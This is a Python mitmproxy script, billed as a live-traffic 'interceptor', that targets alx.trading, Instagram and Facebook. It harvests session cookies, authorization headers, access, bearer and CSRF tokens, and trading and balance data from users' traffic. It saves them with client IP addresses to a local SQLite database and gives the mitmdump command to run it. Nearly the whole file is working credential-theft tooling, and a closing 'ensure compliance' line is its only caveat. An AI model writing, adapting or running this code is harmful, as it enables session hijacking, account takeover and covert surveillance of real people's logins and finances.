#!/usr/bin/env python3
"""
🌐 REAL ALX.TRADING TRAFFIC INTERCEPTOR
=====================================
Intercept REAL traffic from alx.trading and related platforms
NO SIMULATIONS - LIVE TRAFFIC ONLY
"""

from mitmproxy import http, ctx
import sqlite3
import json
import re
from datetime import datetime
import os

class RealALXTradingInterceptor:
    def __init__(self):
        self.target_domains = [
            'alx.trading',
            'app.alx.trading', 
            'api.alx.trading',
            'trade.alx.trading',
            'instagram.com',
            'api.instagram.com',
            'graph.instagram.com',
            'facebook.com'
        ]
        self.setup_database()
        print("🎯 REAL ALX.TRADING INTERCEPTOR ACTIVE")
        print("🌐 Monitoring live traffic...")
    
    def setup_database(self):
        """Setup database for real intercepted data"""
        conn = sqlite3.connect('data/real_intercepted_data.db')
        c = conn.cursor()
        
        # Real session data
        c.execute('''CREATE TABLE IF NOT EXISTS real_sessions (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            timestamp TEXT,
            domain TEXT,
            session_id TEXT,
            cookies TEXT,
            user_agent TEXT,
            ip_address TEXT
        )''')
        
        # Real authentication data
        c.execute('''CREATE TABLE IF NOT EXISTS real_auth_data (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            timestamp TEXT,
            domain TEXT,
            auth_type TEXT,
            token TEXT,
            username TEXT,
            headers TEXT
        )''')
        
        # Real API calls
        c.execute('''CREATE TABLE IF NOT EXISTS real_api_calls (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            timestamp TEXT,
            method TEXT,
            url TEXT,
            headers TEXT,
            request_body TEXT,
            response_body TEXT,
            status_code INTEGER
        )''')
        
        # Real trading data
        c.execute('''CREATE TABLE IF NOT EXISTS real_trading_data (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            timestamp TEXT,
            data_type TEXT,
            content TEXT,
            source_url TEXT
        )''')
        
        conn.commit()
        conn.close()
    
    def request(self, flow: http.HTTPFlow) -> None:
        """Intercept real outgoing requests"""
        url = flow.request.pretty_url.lower()
        
        # Check if this is real target traffic
        if any(domain in url for domain in self.target_domains):
            print(f"🎯 REAL TRAFFIC: {flow.request.method} {flow.request.pretty_url}")
            
            # Extract real session data
            self.extract_real_session_data(flow)
            
            # Extract real authentication
            self.extract_real_auth_data(flow)
            
            # Log real API calls
            if any(api_path in url for api_path in ['/api/', '/graphql', '/ajax/']):
                self.log_real_api_call(flow)
                print(f"📡 REAL API CALL: {flow.request.method} {flow.request.pretty_url}")
    
    def response(self, flow: http.HTTPFlow) -> None:
        """Intercept real incoming responses"""
        url = flow.request.pretty_url.lower()
        
        if any(domain in url for domain in self.target_domains):
            print(f"📥 REAL RESPONSE: {flow.response.status_code} from {flow.request.pretty_url}")
            
            # Extract real trading data from responses
            self.extract_real_trading_data(flow)
            
            # Update API call with response
            self.update_real_api_response(flow)
    
    def extract_real_session_data(self, flow: http.HTTPFlow):
        """Extract real session cookies and data"""
        headers = dict(flow.request.headers)
        cookies = headers.get('cookie', '')
        user_agent = headers.get('user-agent', '')
        
        if cookies:
            print(f"🍪 REAL COOKIES: {len(cookies)} chars")
            
            # Extract session IDs
            session_patterns = [
                r'sessionid=([^;]+)',
                r'PHPSESSID=([^;]+)',
                r'session_token=([^;]+)',
                r'auth_token=([^;]+)'
            ]
            
            for pattern in session_patterns:
                matches = re.findall(pattern, cookies)
                for session_id in matches:
                    print(f"🔑 REAL SESSION: {session_id[:20]}...")
                    self.save_real_session(flow, session_id, cookies, user_agent)
    
    def extract_real_auth_data(self, flow: http.HTTPFlow):
        """Extract real authentication tokens"""
        headers = dict(flow.request.headers)
        
        # Real authorization headers
        auth_headers = [
            'authorization',
            'x-auth-token',
            'x-api-key',
            'x-access-token',
            'x-ig-app-id',
            'x-instagram-ajax'
        ]
        
        for header_name, header_value in headers.items():
            if header_name.lower() in auth_headers:
                print(f"🔐 REAL AUTH: {header_name}")
                self.save_real_auth_data(flow, header_name, header_value)
        
        # Extract tokens from request body
        if flow.request.content:
            try:
                body = flow.request.content.decode('utf-8')
                token_patterns = [
                    r'"access_token":\s*"([^"]+)"',
                    r'"bearer_token":\s*"([^"]+)"',
                    r'"csrf_token":\s*"([^"]+)"',
                    r'"instagram_ajax":\s*"([^"]+)"'
                ]
                
                for pattern in token_patterns:
                    matches = re.findall(pattern, body)
                    for token in matches:
                        print(f"🎫 REAL TOKEN: {token[:20]}...")
                        self.save_real_auth_data(flow, 'body_token', token)
            except:
                pass
    
    def log_real_api_call(self, flow: http.HTTPFlow):
        """Log real API calls"""
        request_body = None
        if flow.request.content:
            try:
                request_body = flow.request.content.decode('utf-8')
            except:
                request_body = f"<binary:{len(flow.request.content)} bytes>"
        
        conn = sqlite3.connect('data/real_intercepted_data.db')
        c = conn.cursor()
        c.execute('''INSERT INTO real_api_calls 
                     (timestamp, method, url, headers, request_body, status_code)
                     VALUES (?, ?, ?, ?, ?, ?)''',
                 (datetime.now().isoformat(), flow.request.method, 
                  flow.request.pretty_url, json.dumps(dict(flow.request.headers)),
                  request_body, 0))
        conn.commit()
        conn.close()
    
    def extract_real_trading_data(self, flow: http.HTTPFlow):
        """Extract real trading data from responses"""
        if not flow.response.content:
            return
        
        try:
            content = flow.response.content.decode('utf-8')
            
            # Look for trading-related data
            trading_keywords = [
                'balance', 'portfolio', 'position', 'trade', 'order',
                'profit', 'loss', 'investment', 'asset', 'crypto',
                'forex', 'stock', 'signal', 'alert', 'strategy'
            ]
            
            content_lower = content.lower()
            found_trading_data = []
            
            for keyword in trading_keywords:
                if keyword in content_lower:
                    found_trading_data.append(keyword)
            
            if found_trading_data:
                print(f"💰 REAL TRADING DATA: {', '.join(found_trading_data)}")
                self.save_real_trading_data('trading_response', content[:5000], flow.request.pretty_url)
            
            # Extract JSON trading data
            if 'application/json' in flow.response.headers.get('content-type', ''):
                try:
                    json_data = json.loads(content)
                    if any(key in str(json_data).lower() for key in trading_keywords):
                        print(f"📊 REAL JSON TRADING DATA: {len(content)} chars")
                        self.save_real_trading_data('json_trading_data', json.dumps(json_data), flow.request.pretty_url)
                except:
                    pass
                    
        except Exception as e:
            print(f"❌ Error extracting trading data: {e}")
    
    def save_real_session(self, flow, session_id, cookies, user_agent):
        """Save real session data"""
        conn = sqlite3.connect('data/real_intercepted_data.db')
        c = conn.cursor()
        c.execute('''INSERT INTO real_sessions 
                     (timestamp, domain, session_id, cookies, user_agent, ip_address)
                     VALUES (?, ?, ?, ?, ?, ?)''',
                 (datetime.now().isoformat(), 
                  flow.request.pretty_host,
                  session_id, cookies, user_agent,
                  flow.client_conn.address[0] if flow.client_conn.address else 'unknown'))
        conn.commit()
        conn.close()
    
    def save_real_auth_data(self, flow, auth_type, token):
        """Save real authentication data"""
        conn = sqlite3.connect('data/real_intercepted_data.db')
        c = conn.cursor()
        c.execute('''INSERT INTO real_auth_data 
                     (timestamp, domain, auth_type, token, headers)
                     VALUES (?, ?, ?, ?, ?)''',
                 (datetime.now().isoformat(),
                  flow.request.pretty_host,
                  auth_type, token,
                  json.dumps(dict(flow.request.headers))))
        conn.commit()
        conn.close()
    
    def save_real_trading_data(self, data_type, content, source_url):
        """Save real trading data"""
        conn = sqlite3.connect('data/real_intercepted_data.db')
        c = conn.cursor()
        c.execute('''INSERT INTO real_trading_data 
                     (timestamp, data_type, content, source_url)
                     VALUES (?, ?, ?, ?)''',
                 (datetime.now().isoformat(), data_type, content, source_url))
        conn.commit()
        conn.close()
    
    def update_real_api_response(self, flow):
        """Update API call with response data"""
        if not any(domain in flow.request.pretty_url.lower() for domain in self.target_domains):
            return
        
        response_body = None
        if flow.response.content:
            try:
                response_body = flow.response.content.decode('utf-8')
            except:
                response_body = f"<binary:{len(flow.response.content)} bytes>"
        
        conn = sqlite3.connect('data/real_intercepted_data.db')
        c = conn.cursor()
        c.execute('''UPDATE real_api_calls 
                     SET response_body = ?, status_code = ?
                     WHERE url = ? AND status_code = 0
                     ORDER BY id DESC LIMIT 1''',
                 (response_body, flow.response.status_code, flow.request.pretty_url))
        conn.commit()
        conn.close()

# Initialize real interceptor
addons = [RealALXTradingInterceptor()]

if __name__ == "__main__":
    print("🎯 REAL ALX.TRADING TRAFFIC INTERCEPTOR")
    print("="*50)
    print("🌐 Ready to intercept LIVE traffic")
    print("🎯 Targets: alx.trading, Instagram, Facebook")
    print("💾 Real data saved to: data/real_intercepted_data.db")
    print()
    print("🚀 Usage:")
    print("   mitmdump -s real_alx_interceptor.py --listen-port 8080")
    print()
    print("⚠️  This intercepts REAL traffic - ensure compliance!")
